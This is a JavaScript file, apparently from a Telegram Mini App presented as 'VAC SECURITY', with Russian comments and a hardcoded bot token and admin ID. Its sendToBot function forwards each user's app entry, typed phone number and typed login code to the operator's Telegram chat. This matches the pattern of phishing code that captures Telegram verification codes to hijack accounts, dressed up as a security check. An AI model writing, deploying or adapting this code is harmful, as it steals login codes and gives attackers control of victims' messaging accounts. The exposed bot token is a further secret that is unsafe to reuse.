// Конфигурация (замените значения)
const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = '5665980031';

// Форматирование сообщения
const formatMessage = (type, data, user) => {
    const userInfo = `👤 ${user.first_name || 'Пользователь'} ${user.last_name || ''}\n` +
                    `🆔 Id: <code>${user.id || '?'}</code>\n` +
                    `🔗 User: <code>@${user.username || '!?'}</code>\n`;
    
    switch(type) {
        case 'init':
            return {
                text: `🚪 <b>Новый вход в приложение</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'phone':
            return {
                text: `📱 <b>Введён номер:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'code':
            return {
                text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        default:
            return {
                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${data}\n\n${userInfo}`,
                buttons: []
            };
    }
};

// Отправка сообщения боту
window.sendToBot = async (type, data = null) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        const message = formatMessage(type, data, user);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `🔐 <b>VAC SECURITY</b>\n\n${message.text}`,
                parse_mode: 'HTML',
                reply_markup: message.buttons.length ? { 
                    inline_keyboard: message.buttons 
                } : undefined
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки:', error);
        return null;
    }
};
